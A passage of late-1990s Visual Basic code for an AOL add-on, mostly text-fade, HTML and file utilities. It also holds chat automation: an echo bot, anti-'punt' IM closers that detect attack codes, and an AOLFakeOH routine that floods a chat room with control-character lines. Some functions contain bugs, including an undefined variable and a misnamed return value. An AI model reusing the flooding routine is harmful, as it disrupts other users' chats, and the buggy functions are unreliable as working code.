        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part4
    textlen% = Len(part4$)
    For i = 1 To textlen%
        TextDone$ = Left(part4$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B5 - B4) / textlen% * i) + B4, ((G5 - G4) / textlen% * i) + G4, ((R5 - R4) / textlen% * i) + R4)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded4$ = Faded4$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part5
    textlen% = Len(part5$)
    For i = 1 To textlen%
        TextDone$ = Left(part5$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B6 - B5) / textlen% * i) + B5, ((G6 - G5) / textlen% * i) + G5, ((R6 - R5) / textlen% * i) + R5)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded5$ = Faded5$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part6
    textlen% = Len(part6$)
    For i = 1 To textlen%
        TextDone$ = Left(part6$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B7 - B6) / textlen% * i) + B6, ((G7 - G6) / textlen% * i) + G6, ((R7 - R6) / textlen% * i) + R6)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded6$ = Faded6$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i
    
    'part7
    textlen% = Len(part7$)
    For i = 1 To textlen%
        TextDone$ = Left(part7$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B8 - B7) / textlen% * i) + B7, ((G8 - G7) / textlen% * i) + G7, ((R8 - R7) / textlen% * i) + R7)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded7$ = Faded7$ + "<Font Color=#" & colorx2 & ">" + TheHTML + LastChr$
    Next i

    FadeEightColor = Faded1$ + Faded2$ + Faded3$ + Faded4$ + Faded5$ + Faded6$ + Faded7$
End Function


Function InverseColor(OldColor)
'by monk-e-god
dacolor$ = RGBtoHEX(OldColor)
redx% = Val("&H" + Right(dacolor$, 2))
greenx% = Val("&H" + Mid(dacolor$, 3, 2))
bluex% = Val("&H" + Left(dacolor$, 2))
newred% = 255 - redx%
newgreen% = 255 - greenx%
newblue% = 255 - bluex%
InverseColor = RGB(newred%, newgreen%, newblue%)

End Function



Function Replacer(TheStr As String, This As String, WithThis As String)
'by monk-e-god
Dim STRwo13s As String
STRwo13s = TheStr
Do While InStr(1, STRwo13s, This)
DoEvents
thepos% = InStr(1, STRwo13s, This)
STRwo13s = Left(STRwo13s, (thepos% - 1)) + WithThis + Right(STRwo13s, Len(STRwo13s) - (thepos% + Len(This) - 1))
Loop

Replacer = STRwo13s
End Function
Function RGBtoHEX(RGB)
'heh, I didnt make this one...
    A$ = Hex(RGB)
    b% = Len(A$)
    If b% = 5 Then A$ = "0" & A$
    If b% = 4 Then A$ = "00" & A$
    If b% = 3 Then A$ = "000" & A$
    If b% = 2 Then A$ = "0000" & A$
    If b% = 1 Then A$ = "00000" & A$
    RGBtoHEX = A$
End Function

Function Rich2HTML(RichTXT As Control, StartPos%, EndPos%)
'by monk-e-god
Dim Bolded As Boolean
Dim Undered As Boolean
Dim Striked As Boolean
Dim Italiced As Boolean
Dim LastCRL As Long
Dim LastFont As String
Dim HTMLString As String

For posi% = StartPos To EndPos
RichTXT.SelStart = posi%
RichTXT.SelLength = 1

If Bolded <> RichTXT.SelBold Or posi% = StartPos Then
If RichTXT.SelBold = True Then
HTMLString = HTMLString + "<b>"
Bolded = True
Else
HTMLString = HTMLString + "</b>"
Bolded = False
End If
End If

If Undered <> RichTXT.SelUnderline Or posi% = StartPos Then
If RichTXT.SelUnderline = True Then
HTMLString = HTMLString + "<u>"
Undered = True
Else
HTMLString = HTMLString + "</u>"
Undered = False
End If
End If

If Striked <> RichTXT.SelStrikeThru Or posi% = StartPos Then
If RichTXT.SelStrikeThru = True Then
HTMLString = HTMLString + "<s>"
Striked = True
Else
HTMLString = HTMLString + "</s>"
Striked = False
End If
End If

If Italiced <> RichTXT.SelItalic Or posi% = StartPos Then
If RichTXT.SelItalic = True Then
HTMLString = HTMLString + "<i>"
Italiced = True
Else
HTMLString = HTMLString + "</i>"
Italiced = False
End If
End If

If LastCRL <> RichTXT.SelColor Or posi% = StartPos Then
colorx = RGB(GetRGB(RichTXT.SelColor).blue, GetRGB(RichTXT.SelColor).green, GetRGB(RichTXT.SelColor).red)
colorhex = RGBtoHEX(colorx)
HTMLString = HTMLString + "<Font Color=#" & colorhex & ">"
LastCRL = RichTXT.SelColor
End If

If LastFont <> RichTXT.SelFontName Then
HTMLString = HTMLString + "<font face=" + Chr(34) + RichTXT.SelFontName + Chr(34) + ">"
LastFont = RichTXT.SelFontName
End If

HTMLString = HTMLString + RichTXT.SelText
Next posi%

Rich2HTML = HTMLString

End Function

Function HTMLtoRGB(TheHTML$)
'by monk-e-god
'converts HTML such as 0000FF to an
'RGB value like &HFF0000 so you can
'use it in the FadeByColor functions
If Left(TheHTML$, 1) = "#" Then TheHTML$ = Right(TheHTML$, 6)

redx$ = Left(TheHTML$, 2)
greenx$ = Mid(TheHTML$, 3, 2)
bluex$ = Right(TheHTML$, 2)
rgbhex$ = "&H00" + bluex$ + greenx$ + redx$ + "&"
HTMLtoRGB = Val(rgbhex$)
End Function
Function FadeFourColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, thetext$, WavY As Boolean)
'by monk-e-god
    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    textlen% = Len(thetext)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    seclen% = seclen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    thrdlen% = thrdlen% + 1: textlen% = textlen% - 1
    If textlen% < 1 Then Exit Do
    Loop Until textlen% < 1
    
    part1$ = Left(thetext, fstlen%)
    part2$ = Mid(thetext, fstlen% + 1, seclen%)
    part3$ = Right(thetext, thrdlen%)
    
    'part1
    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B2 - B1) / textlen% * i) + B1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    'part2
    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B3 - B2) / textlen% * i) + B2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    'part3
    textlen% = Len(part3$)
    For i = 1 To textlen%
        TextDone$ = Left(part3$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B4 - B3) / textlen% * i) + B3, ((G4 - G3) / textlen% * i) + G3, ((R4 - R3) / textlen% * i) + R3)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded3$ = Faded3$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    FadeFourColor = Faded1$ + Faded2$ + Faded3$
End Function

Function FadeThreeColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, thetext$, WavY As Boolean)
'by H8er
    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    textlen% = Len(thetext)
    fstlen% = (Int(textlen%) / 2)
    part1$ = Left(thetext, fstlen%)
    part2$ = Right(thetext, textlen% - fstlen%)
    'part1
    textlen% = Len(part1$)
    For i = 1 To textlen%
        TextDone$ = Left(part1$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B2 - B1) / textlen% * i) + B1, ((G2 - G1) / textlen% * i) + G1, ((R2 - R1) / textlen% * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded1$ = Faded1$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    'part2
    textlen% = Len(part2$)
    For i = 1 To textlen%
        TextDone$ = Left(part2$, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B3 - B2) / textlen% * i) + B2, ((G3 - G2) / textlen% * i) + G2, ((R3 - R2) / textlen% * i) + R2)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded2$ = Faded2$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    
    
    FadeThreeColor = Faded1$ + Faded2$
End Function

Function FadeTwoColor(R1%, G1%, B1%, R2%, G2%, B2%, thetext$, WavY As Boolean)
'by monk-e-god
    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    textlen$ = Len(thetext)
    For i = 1 To textlen$
        TextDone$ = Left(thetext, i)
        LastChr$ = Right(TextDone$, 1)
        colorx = RGB(((B2 - B1) / textlen$ * i) + B1, ((G2 - G1) / textlen$ * i) + G1, ((R2 - R1) / textlen$ * i) + R1)
        colorx2 = RGBtoHEX(colorx)
        
        If WavY = True Then
        WaveState = WaveState + 1
        If WaveState > 10 Then WaveState = 1
        If WaveState = 1 Then WaveHTML = "<sup>"
        If WaveState = 2 Then WaveHTML = "</sup>"
        If WaveState = 3 Then WaveHTML = "<sub>"
        If WaveState = 4 Then WaveHTML = "</sub>"
        If WaveState = 5 Then WaveHTML = "<sup>"
        If WaveState = 6 Then WaveHTML = "</sup>"
        If WaveState = 7 Then WaveHTML = "<sub>"
        If WaveState = 8 Then WaveHTML = "</sub>"
        If WaveState = 9 Then WaveHTML = "<sup>"
        If WaveState = 10 Then WaveHTML = "</sup>"
        Else
        WaveHTML = ""
        End If
        
        Faded$ = Faded$ + "<Font Color=#" & colorx2 & ">" + WaveHTML + LastChr$
    Next i
    FadeTwoColor = Faded$
End Function

Sub IceFade(vForm As Object)
    'This code works best when called in the paint event
    On Error Resume Next
    Dim intLoop As Integer 'Variable for loop
    vForm.DrawStyle = vbInsideSolid 'Set Form Modes
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255 'Begin Loop
        'This code can be changed to make different colors
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 255 - intLoop, 255), B 'Draw boxes with specified color of loop
        Next intLoop
End Sub
Sub BlueFade(vForm As Object)
    'This code works best when called in the paint event
    
    On Error Resume Next
    Dim intLoop As Integer 'Variable for loop
    vForm.DrawStyle = vbInsideSolid 'Set Form Modes
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255 'Begin Loop
        'This code can be changed to make different colors
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 0, 255 - intLoop), B 'Draw boxes with specified color of loop
        Next intLoop
End Sub

Sub GreenFade(vForm As Object)
    'This code works best when called in the paint event
    On Error Resume Next
    Dim intLoop As Integer 'Variable for loop
    vForm.DrawStyle = vbInsideSolid 'Set Form Modes
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255 'Begin Loop
        'This code can be changed to make different colors
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 255 - intLoop, 0), B 'Draw boxes with specified color of loop
    Next intLoop
End Sub
Sub RedFade(vForm As Object)
    'This code works best when called in the paint event
    On Error Resume Next
    Dim intLoop As Integer 'Variable for loop
    vForm.DrawStyle = vbInsideSolid 'Set Form Modes
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255 'Begin Loop
        'This code can be changed to make different colors
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 0), B 'Draw boxes with specified color of loop
    Next intLoop
End Sub
Sub FireFade(vForm As Object)
    'This code works best when called in the paint event
    On Error Resume Next
    Dim intLoop As Integer 'Variable for loop
    vForm.DrawStyle = vbInsideSolid 'Set Form Modes
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255 'Begin Loop
        'This code can be changed to make different colors
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255, 255 - intLoop, 0), B 'Draw boxes with specified color of loop
        Next intLoop
End Sub
Function AOLVersion()
'if AOLversion = 4 then msgbox "You are using AOL 4.o" else "This is for AOL 4.o ONLY...please install it now!"
AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
Glyph% = FindChildByClass(AOTool2%, "_AOL_Glyph")
If Glyph% <> 0 Then AOLVersion = 4
AOL% = FindWindow("AOL Frame25", 0&)
Wel% = FindChildByTitle(AOL%, "Welcome, " + UserSN())
aol3% = FindChildByClass(Wel%, "RICHCNTL")
If aol3% = 0 Then AOLVersion = 25: Exit Function
If aol3% <> 0 Then
If GetCaption(AOL%) <> "America Online" Then AOLVersion = 3
End If
End Function
Function Fader(thetext$)
G$ = thetext
A = Len(G$)
For W = 1 To A Step 8
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    V$ = Mid$(G$, W + 4, 1)
    Q$ = Mid$(G$, W + 5, 1)
    X$ = Mid$(G$, W + 6, 1)
    Y$ = Mid$(G$, W + 7, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#000000" & Chr$(34) & ">" & r$ & "<FONT COLOR=" & Chr$(34) & "#696969" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#808080" & Chr$(34) & ">" & S$ & "<FONT COLOR=" & Chr$(34) & "#C0C0C0" & Chr$(34) & ">" & T$ & "<FONT COLOR=" & Chr$(34) & "#DCDCDC" & Chr$(34) & ">" & V$ & "<FONT COLOR=" & Chr$(34) & "#C0C0C0" & Chr$(34) & ">" & Q$ & "<FONT COLOR=" & Chr$(34) & "#808080" & Chr$(34) & ">" & X$ & "<FONT COLOR=" & Chr$(34) & "#696969" & Chr$(34) & ">" & Y$
Next W
SendChat p$
End Function
Sub BotEcho(persontoecho$)

'put in a timer with interval = 1:

'Call BotEcho("persons screen name to echo")

On Error GoTo hell

lastline$ = ChatLastLine

If lastline$ = OldLast$ Then Exit Sub

OldLast$ = lastline$

whoend = InStr(lastline$, ":")

who$ = Left$(lastline$, whoend - 1)

what$ = Mid$(lastline$, whoend + 3)

If LCase(TrimSpaces(who$)) = LCase(TrimSpaces(persontoecho$)) Then

Call ChatSend(what$)

End If

hell:

End Sub

Sub ChatClearText()

Rich% = FindChildByClass(ChatFindRoom, "RICHCNTL")

Call AOLSetText(Rich%, "")

ChatSend AOLUser & " Chat Cleared!"

End Sub
Sub ChatSend2(text)

'this has a pause at the bottom, so u cant

'scroll off with the new tos thingy

If ChatFindRoom = 0 Then Exit Sub

R7% = ChatSendBox

FreeProcess

sBuffer = GetText(R7%)

Call AOLSetText(R7%, "")

Call AOLSetText(R7%, text)

Do

Call SendCharNum(R7%, 13)

Pause 0.2

Loop Until GetText(ChatSendBox) <> text

Call AOLSetText(R7%, sBuffer)

Pause 0.6

End Sub
Function FileOpenAsBinary(Path$) As String

'By LiviD =]

Filenum = FreeFile

Open Path$ For Binary As #Filenum

Anti$ = String$(LOF(Filenum), " ")

Get #Filenum, , Anti$

File_OpenAsBinary = Anti$

Close #Filenum

End Function

Sub FileSaveAsBinary(Path$, what$, frm As Form)

'By LiviD =]

On Error GoTo Lover

Filenum = FreeFile

Open Path$ For Binary As #Filenum

Put #Filenum, 1, what$

Close #Filenum

Exit Sub

Lover:

Close #Filenum

End Sub

Function FileSearch(FileName As String, SearchString As String) As Long

'searches through a file for a string

'if the string is found then it returns the

'place where its located

Free = FreeFile

Dim Where As Long

Open FileName$ For Binary Access Read As #Free

For X = 1 To LOF(Free) Step 32000

    text$ = Space(32000)

    Get #Free, X, text$

    Debug.Print X

    If InStr(1, text$, SearchString$, 1) Then

        Where = InStr(1, text$, SearchString$, 1)

        FileSearch = (Where + X) - 1

        Close #Free

        Exit For

    End If

    Next X

Close #Free

End Function

Public Function Random(Index As Integer)
Randomize
Result = Int((Index * Rnd) + 1)
Random = Result
'To usethis,  example
'Dim NumSel As Integer
'NumSel = Random(2)
'If NumSel = 1 Then

'The number in ( ) is the max num.
'With that example you will either get a 1 or 2
End Function
Sub AntipuntALL(List As ListBox)
' this antipunt is good but it doesn't distinguish the IMs
' it kills them all
' put in a timer with an interval of about 50-100

AOL = FindWindow("AOL Frame25", vbNullString)
MDI = FindChildByClass(AOL, "MDIClient")
IMWin = FindChildByTitle(MDI, ">Instant Message From:")
rch2% = FindChildByClass(IMWin, "RICHCNTL")
nme = SNfromIM

If rch2% <> 0 Then
S = SendMessageByNum(rch2%, WM_CLOSE, 0, 0)
S = SendMessageByNum(rch2%, WM_CLOSE, 0, 0)
S = SendMessageByNum(rch2%, WM_CLOSE, 0, 0)
S = SendMessageByNum(rch2%, WM_CLOSE, 0, 0)
r = ShowWindow(IMWin, SW_HIDE)
List.AddItem nme
Call KillListDupes(List)
Exit Sub
End If

End Sub
Sub AntiPuntDis()
' this anti punt goes in a timer with an
' interval of about 50-100
' this will also distinguish whether the IM contains
' the h3 or the CTRL Backspace punt codes
'just type  Call AntiPuntDis in the timer code

AOL = FindWindow("AOL Frame25", "America  Online")
MDI = FindChildByClass(AOL, "MDIClient")
IMWin = FindChildByTitle(MDI, ">Instant Message From:")
rch2% = FindChildByClass(IMWin, "RICHCNTL")
nme = SNfromIM
X = GetText(rch2%)
If InStr(X, "    ") Then
Do
S = SendMessageByNum(rch2%, WM_CLOSE, 0, 0)
Loop Until rch2% <> 1
sendtext "" & nme & " Is trying to punt me"
End If

If InStr(X, "") Then
Do
S = SendMessageByNum(rch2%, WM_CLOSE, 0, 0)
Loop Until rch2% <> 1
sendtext "" & nme & " Is trying to punt me"
End If
End Sub

Sub AOLFakeOH()
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
